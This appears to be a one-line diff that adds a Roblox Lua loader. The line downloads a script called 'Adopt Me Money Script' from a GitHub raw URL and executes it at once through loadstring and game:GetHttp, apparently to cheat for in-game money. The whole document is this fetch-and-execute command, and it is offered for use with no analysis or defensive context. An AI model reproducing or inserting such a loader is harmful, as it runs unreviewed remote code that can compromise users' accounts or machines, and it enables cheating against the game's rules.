@@ -1,0 +1,1 @@
+loadstring(game:GetHttp('https://raw.githubusercontent.com/ChaosityYT/GameScripts/master/Adopt%20Me%20Money%20Script.txt',true))()
